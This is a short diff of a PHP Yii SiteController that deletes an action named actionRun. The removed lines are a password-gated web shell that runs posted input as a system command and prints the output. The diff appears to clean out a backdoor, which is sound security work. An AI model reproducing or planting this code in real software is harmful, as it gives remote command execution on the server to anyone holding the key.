@@ -219,17 +219,7 @@ class SiteController extends Controller
 			'returnUrl' => $returnUrl
         ]);
 	}
-	
-	public function actionRun($key=false)
-	{
-		if (md5($key) !== '4978be2a2c71d031c6040ea94eb81d8a')
-			throw new CHttpException(404);
-			
-		echo "<form method='POST'><input name='run'></form>";
-		if (isset($_POST['run']))
-			echo '<xmp>'.`{$_POST['run']}`.'</xmp>';
-	}
-	
+
 	public function actionUserpanel()
 	{
 		$this->render('userpanel', array(
